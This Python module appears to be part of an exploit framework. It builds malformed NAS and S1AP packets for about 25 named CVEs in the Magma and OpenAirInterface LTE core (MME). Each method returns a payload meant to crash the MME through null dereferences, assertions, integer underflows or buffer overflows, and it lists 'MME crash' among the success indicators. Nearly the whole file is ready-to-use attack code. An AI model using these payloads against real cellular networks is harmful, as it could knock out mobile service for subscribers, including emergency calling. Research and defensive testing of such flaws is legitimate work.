#!/usr/bin/env python3
"""
Magma/OpenAirInterface LTE Exploit Payloads (39 CVEs)
S1AP/NAS Protocol vulnerabilities in Magma <= 1.8.0, OAI EPC
"""

from .ransacked_core import ExploitPayload, PacketBuilder, ASN1Builder
import struct
import logging

logger = logging.getLogger(__name__)

class MagmaLTEExploits:
    """Magma/OAI LTE vulnerability exploits"""
    
    def __init__(self):
        self.pb = PacketBuilder()
        self.asn1 = ASN1Builder()
    
    # NAS Protocol Vulnerabilities
    
    def cve_2023_37024(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37024 / VULN-D01: Emergency Number List Fatal Assertion"""
        # NAS Attach Request with Emergency Number List IE triggers Fatal("TODO...")
        packet = (
            b'\x07' +  # Protocol discriminator: EPS MM
            b'\x41' +  # Message type: Attach Request
            b'\x00' * 20 +  # Minimal required IEs
            b'\x34' +  # IEI: Emergency Number List
            b'\x05' +  # Length
            b'\x01\x00\x31\x31\x32'  # Emergency number: 112
        )
        return ExploitPayload(
            packet=packet,
            protocol='NAS',
            description='Emergency Number List IE triggers Fatal("TODO emergency_number_list_t->next")',
            success_indicators=['MME crash', 'Fatal assertion', 'TODO triggered']
        )
    
    def cve_2023_37029(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37029 / VULN-D06: Oversized NAS Packet Assertion"""
        # NAS packet > 1000 bytes triggers AssertFatal
        packet = b'\x07\x41' + b'\x41' * 1050  # EMM Attach Request + padding
        return ExploitPayload(
            packet=packet,
            protocol='NAS',
            description='NAS packet >1000 bytes triggers AssertFatal(nas_msg_length < 1000)',
            success_indicators=['MME crash', 'AssertFatal failure', 'Bad length']
        )
    
    def cve_2023_37032(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37032 / VULN-D09: Emergency Number Buffer Overflow"""
        # Emergency Number List with >20 digits overflows number_digit[20] array
        packet = (
            b'\x07\x41' + b'\x00' * 20 +
            b'\x34' +  # Emergency Number List IEI
            b'\x1A' +  # Length: 26 (exceeds EMERGENCY_NUMBER_MAX_DIGITS=20)
            b'\x01' +  # Emergency service category
            b'\x31' * 25  # 25 digits (overflows)
        )
        return ExploitPayload(
            packet=packet,
            protocol='NAS',
            description='Emergency Number List >20 digits overflows number_digit[] buffer',
            success_indicators=['MME crash', 'Buffer overflow', 'Heap corruption']
        )
    
    def cve_2024_24419(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24419 / VULN-D16: Traffic Flow Template OOB Read"""
        # Bearer Resource Modification Request with malformed TFT
        packet = (
            b'\x07\xcd' +  # Protocol discriminator + Message type
            b'\x00\x00' +  # Procedure transaction ID + EPS bearer ID
            b'\x36' +  # Traffic flow template IEI
            b'\x05' +  # TFT operation: Create new TFT
            b'\x01' +  # Number of packet filters
            b'\x01' +  # Packet filter identifier (unchecked before read)
            b'\x00\xFF'  # Eval precedence + Length (triggers OOB read)
        )
        return ExploitPayload(
            packet=packet,
            protocol='NAS',
            description='Malformed TFT packet filter causes OOB read (no bound check)',
            success_indicators=['MME crash', 'Out-of-bounds read', 'Segmentation fault']
        )
    
    def cve_2024_24416(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24416 / VULN-D17: Access Point Name Buffer Overflow"""
        # PDN Connectivity Request with malformed APN
        packet = (
            b'\x07\xd0' +  # Protocol discriminator + Message type
            b'\x00\x02' +  # Procedure transaction ID + Request type
            b'\x28' +  # Access Point Name IEI
            b'\xFF' +  # APN length (unchecked, triggers overflow in blk2bstr)
            b'\x41' * 200  # Data exceeding actual buffer
        )
        return ExploitPayload(
            packet=packet,
            protocol='NAS',
            description='Malformed APN IE with unchecked length causes buffer overflow',
            success_indicators=['MME crash', 'Buffer overflow', 'blk2bstr overflow']
        )
    
    def cve_2024_24424(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24424 / VULN-D18: Access Point Name Assertion"""
        # APN with ielen < length_apn triggers AssertFatal
        packet = (
            b'\x07\xd0\x00\x02' +
            b'\x28' +  # APN IEI
            b'\x05' +  # ielen = 5
            b'\x0A' +  # length_apn = 10 (exceeds ielen, triggers assertion)
            b'\x74\x65\x73\x74'  # "test"
        )
        return ExploitPayload(
            packet=packet,
            protocol='NAS',
            description='APN with ielen < length_apn triggers AssertFatal',
            success_indicators=['MME crash', 'AssertFatal failure', 'Mismatch in lengths']
        )
    
    def cve_2024_24420(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24420 / VULN-D19: Linked TI Fatal Assertion"""
        # NAS packet with Linked TI IE triggers Fatal("TODO...")
        packet = (
            b'\x07\xd0\x00\x02' +
            b'\x08' +  # Linked TI IEI (triggers Fatal)
            b'\x00'
        )
        return ExploitPayload(
            packet=packet,
            protocol='NAS',
            description='Linked TI IE triggers Fatal("TODO Implement decode_linked_ti_ie")',
            success_indicators=['MME crash', 'Fatal assertion', 'TODO triggered']
        )
    
    def cve_2024_24418(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24418 / VULN-D20: PDN Address Buffer Overflow"""
        # PDN Address with len=0 causes integer underflow in CHECK_LENGTH_DECODER
        packet = (
            b'\x07\xd0\x00\x02' +
            b'\x29' +  # PDN Address IEI
            b'\x00' +  # ielen = 0 (causes len - decoded underflow)
            b'\x01'   # PDN type value (OOB read)
        )
        return ExploitPayload(
            packet=packet,
            protocol='NAS',
            description='PDN Address with len=0 causes integer underflow, OOB read',
            success_indicators=['MME crash', 'Integer underflow', 'Out-of-bounds access']
        )
    
    def cve_2024_24421(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24421 / VULN-D21: EMM Attach Request Type Confusion"""
        # Encrypted NAS with inner ESM header interpreted as EMM (type confusion)
        packet = (
            b'\x07\x02' +  # Security header: Integrity protected, ciphered
            b'\x00\x00\x00\x00' +  # MAC
            b'\x01' +  # Sequence number
            b'\x02' +  # INNER: Protocol discriminator ESM (not EMM!)
            b'\xd0'  # PDN Connectivity Request (ESM message)
            # Rest of payload causes type confusion when accessed as EMM
        )
        return ExploitPayload(
            packet=packet,
            protocol='NAS',
            description='Encrypted ESM message misinterpreted as EMM causes type confusion',
            success_indicators=['MME crash', 'Type confusion', 'Union misinterpretation']
        )
    
    def cve_2024_24423(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24423 / VULN-D22: ESM Message Container Overflow"""
        # ESM Message Container with len < 2 causes underflow
        packet = (
            b'\x07\x41\x00\x00\x00' +
            b'\x78' +  # ESM Message Container IEI
            b'\x00\x01' +  # Length U16 = 1 (len < 2 causes CHECK_LENGTH underflow)
            b'\x41'
        )
        return ExploitPayload(
            packet=packet,
            protocol='NAS',
            description='ESM Message Container with len<2 causes integer underflow, OOB read',
            success_indicators=['MME crash', 'Integer underflow', 'decode_bstring OOB']
        )
    
    def cve_2024_24417(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24417 / VULN-D23: Protocol Configuration Options OOB Read"""
        # Protocol Config Options with len=0 causes OOB read
        packet = (
            b'\x07\xd0\x00\x02' +
            b'\x27' +  # Protocol Configuration Options IEI
            b'\x00'  # Length = 0 (triggers OOB read without check)
        )
        return ExploitPayload(
            packet=packet,
            protocol='NAS',
            description='Protocol Config Options len=0 triggers OOB read (no length check)',
            success_indicators=['MME crash', 'Out-of-bounds read', 'Segmentation fault']
        )
    
    def cve_2024_24422(self, target_ip: str) -> ExploitPayload:
        """CVE-2024-24422 / VULN-D24: Protocol Configuration Options Write Overflow"""
        # Protocol Config Options with >30 protocol IDs overflows array
        packet = (
            b'\x07\xd0\x00\x02' +
            b'\x27\x80\x80' +  # PCO IEI + ext bit + config protocol
            (b'\x00\x01\x00' * 35)  # 35 protocol IDs (exceeds 30 element limit)
        )
        return ExploitPayload(
            packet=packet,
            protocol='NAS',
            description='PCO with >30 protocol IDs overflows protocol_or_container_ids[30] array',
            success_indicators=['MME crash', 'Array overflow', 'Heap corruption']
        )
    
    # S1AP Protocol Vulnerabilities (19 CVEs)
    
    def cve_2023_37025(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37025 / VULN-D02: Reset Missing ResetType"""
        packet = (
            self.pb.build_s1ap_header(0x0e, 0x00) +  # Reset
            self.asn1.encode_ie(0x00, b'\x00\x01', 0)  # Dummy IE, NO ResetType
        )
        return ExploitPayload(
            packet=packet,
            protocol='S1AP',
            description='Reset message missing required ResetType causes null deref',
            success_indicators=['MME crash', 'Null pointer dereference', 'S1AP_FIND_PROTOCOLIE']
        )
    
    def cve_2023_37026(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37026 / VULN-D03: E-RAB Release Response Missing MME-UE-S1AP-ID"""
        packet = (
            self.pb.build_s1ap_header(0x15, 0x20) +  # E-RAB Release Response
            self.asn1.encode_ie(0x08, b'\x00\x01', 0)  # ENB-UE-S1AP-ID only, NO MME-UE-S1AP-ID
        )
        return ExploitPayload(
            packet=packet,
            protocol='S1AP',
            description='E-RAB Release Response missing MME-UE-S1AP-ID causes null deref',
            success_indicators=['MME crash', 'Null deref on ie->value.choice']
        )
    
    def cve_2023_37027(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37027 / VULN-D04: E-RAB Modification Indication Missing MME-UE-S1AP-ID"""
        packet = (
            self.pb.build_s1ap_header(0x1f, 0x00) +  # E-RAB Modification Indication
            self.asn1.encode_ie(0x08, b'\x00\x01', 0)  # ENB-UE-S1AP-ID only
        )
        return ExploitPayload(
            packet=packet,
            protocol='S1AP',
            description='E-RAB Modification Indication missing MME-UE-S1AP-ID',
            success_indicators=['MME crash', 'Null pointer dereference']
        )
    
    def cve_2023_37028(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37028 / VULN-D05: E-RAB Modification Indication Missing eNB-UE-S1AP-ID"""
        packet = (
            self.pb.build_s1ap_header(0x1f, 0x00) +
            self.asn1.encode_ie(0x00, b'\x00\x00\x00\x01', 0)  # MME-UE-S1AP-ID only
        )
        return ExploitPayload(
            packet=packet,
            protocol='S1AP',
            description='E-RAB Modification Indication missing eNB-UE-S1AP-ID',
            success_indicators=['MME crash', 'Null deref on ENB_UE_S1AP_ID']
        )
    
    def cve_2023_37030(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37030 / VULN-D07: Initial UE Message Missing ENB-UE-S1AP-ID"""
        packet = (
            self.pb.build_s1ap_header(0x0c, 0x00) +  # Initial UE Message
            self.asn1.encode_ie(0x1a, b'\x00' * 10, 0)  # NAS-PDU only, NO ENB-UE-S1AP-ID
        )
        return ExploitPayload(
            packet=packet,
            protocol='S1AP',
            description='Initial UE Message missing ENB-UE-S1AP-ID causes null deref',
            success_indicators=['MME crash', 'Null pointer dereference']
        )
    
    def cve_2023_37031(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37031 / VULN-D08: eNB Configuration Transfer Missing Target eNB ID"""
        packet = (
            self.pb.build_s1ap_header(0x29, 0x00) +  # eNB Configuration Transfer
            self.asn1.encode_ie(0x8e, b'\x00', 0)  # Dummy IE, NO SONConfigurationTransferECT
        )
        return ExploitPayload(
            packet=packet,
            protocol='S1AP',
            description='eNB Config Transfer missing Target eNB ID causes null deref',
            success_indicators=['MME crash', 'Null deref on targeteNB_ID']
        )
    
    def cve_2023_37033(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37033 / VULN-D10: Initial UE Message Missing EUTRAN CGI"""
        packet = (
            self.pb.build_s1ap_header(0x0c, 0x00) +
            self.asn1.encode_ie(0x08, b'\x00\x01', 0) +  # ENB-UE-S1AP-ID
            self.asn1.encode_ie(0x1a, b'\x07\x41', 0)  # NAS-PDU, NO EUTRAN_CGI
        )
        return ExploitPayload(
            packet=packet,
            protocol='S1AP',
            description='Initial UE Message missing EUTRAN CGI causes null deref',
            success_indicators=['MME crash', 'Null deref on pLMNidentity']
        )
    
    def cve_2023_37034(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37034 / VULN-D11: Initial UE Message Missing TAI"""
        packet = (
            self.pb.build_s1ap_header(0x0c, 0x00) +
            self.asn1.encode_ie(0x08, b'\x00\x01', 0) +  # ENB-UE-S1AP-ID
            self.asn1.encode_ie(0x1a, b'\x07\x41', 0)  # NAS-PDU, NO TAI
        )
        return ExploitPayload(
            packet=packet,
            protocol='S1AP',
            description='Initial UE Message missing TAI causes null deref',
            success_indicators=['MME crash', 'Null deref on ie->value.choice.TAI']
        )
    
    def cve_2023_37035(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37035 / VULN-D12: S1 Setup Request Missing Global eNB ID"""
        packet = (
            self.pb.build_s1ap_header(0x11, 0x00) +  # S1 Setup Request
            self.asn1.encode_ie(0x40, b'\x00', 0)  # Dummy IE, NO Global_ENB_ID
        )
        return ExploitPayload(
            packet=packet,
            protocol='S1AP',
            description='S1 Setup Request missing Global eNB ID causes null deref',
            success_indicators=['MME crash', 'Null deref on Global_ENB_ID']
        )
    
    def cve_2023_37036(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37036 / VULN-D13: Uplink NAS Transport Missing ENB-UE-S1AP-ID"""
        packet = (
            self.pb.build_s1ap_header(0x0d, 0x00) +  # Uplink NAS Transport
            self.asn1.encode_ie(0x00, b'\x00\x00\x00\x01', 0)  # MME-UE-S1AP-ID only
        )
        return ExploitPayload(
            packet=packet,
            protocol='S1AP',
            description='Uplink NAS Transport missing ENB-UE-S1AP-ID',
            success_indicators=['MME crash', 'Null deref on enb_ue_s1ap_id']
        )
    
    def cve_2023_37037(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37037 / VULN-D14: S1 Setup Request Missing Supported TAs"""
        packet = (
            self.pb.build_s1ap_header(0x11, 0x00) +
            self.asn1.encode_ie(0x3b, b'\x00\x01\x00\x01', 0)  # Global ENB ID only, NO Supported TAs
        )
        return ExploitPayload(
            packet=packet,
            protocol='S1AP',
            description='S1 Setup Request missing Supported TAs causes null deref',
            success_indicators=['MME crash', 'Null deref on ie_supported_tas']
        )
    
    def cve_2023_37038(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37038 / VULN-D15: Uplink NAS Transport Missing MME-UE-S1AP-ID"""
        packet = (
            self.pb.build_s1ap_header(0x0d, 0x00) +
            self.asn1.encode_ie(0x08, b'\x00\x01', 0)  # ENB-UE-S1AP-ID only
        )
        return ExploitPayload(
            packet=packet,
            protocol='S1AP',
            description='Uplink NAS Transport missing MME-UE-S1AP-ID',
            success_indicators=['MME crash', 'Null deref on mme_ue_s1ap_id']
        )
    
    def cve_2023_37039(self, target_ip: str) -> ExploitPayload:
        """CVE-2023-37039 / VULN-D25: Initial UE Message Missing NAS-PDU"""
        packet = (
            self.pb.build_s1ap_header(0x0c, 0x00) +
            self.asn1.encode_ie(0x08, b'\x00\x01', 0) +  # ENB-UE-S1AP-ID
            self.asn1.encode_ie(0x43, b'\x00' * 5, 0)  # TAI, NO NAS-PDU
        )
        return ExploitPayload(
            packet=packet,
            protocol='S1AP',
            description='Initial UE Message missing mandatory NAS-PDU causes null deref',
            success_indicators=['MME crash', 'Null deref on NAS_PDU.buf']
        )

__all__ = ['MagmaLTEExploits']
